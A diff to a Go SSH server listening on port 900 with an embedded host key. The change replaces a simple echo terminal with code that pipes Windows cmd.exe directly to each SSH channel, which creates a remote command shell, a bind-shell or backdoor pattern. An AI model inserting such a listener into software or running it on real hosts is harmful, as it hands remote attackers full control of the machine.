@@ -4,9 +4,9 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os/exec"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/terminal"
 )
 
 func main() {
@@ -35,7 +35,7 @@ Uv/Vmfjc4SDQ6OPt0BNWTIP3t70Y64yK4ouUAigruA==
 	config.AddHostKey(privateKey)
 
 	// Begin accepting connections
-	listener, error := net.Listen("TCP", "0.0.0.0:900")
+	listener, error := net.Listen("tcp", "0.0.0.0:900")
 	if error != nil {
 		log.Fatal("Failed to listen for connection: ", error)
 	}
@@ -76,17 +76,11 @@ Uv/Vmfjc4SDQ6OPt0BNWTIP3t70Y64yK4ouUAigruA==
 			}
 		}(requests)
 
-		term := terminal.NewTerminal(channel, ">")
+		shell := exec.Command("C:\\Windows\\System32\\cmd.exe")
+		shell.Stdin = channel
+		shell.Stdout = channel
+		shell.Stderr = channel
+		shell.Run()
 
-		go func() {
-			for {
-				line, error := term.ReadLine()
-				if error != nil {
-					break
-				}
-				fmt.Println(line)
-			}
-			channel.Close()
-		}()
 	}
 }
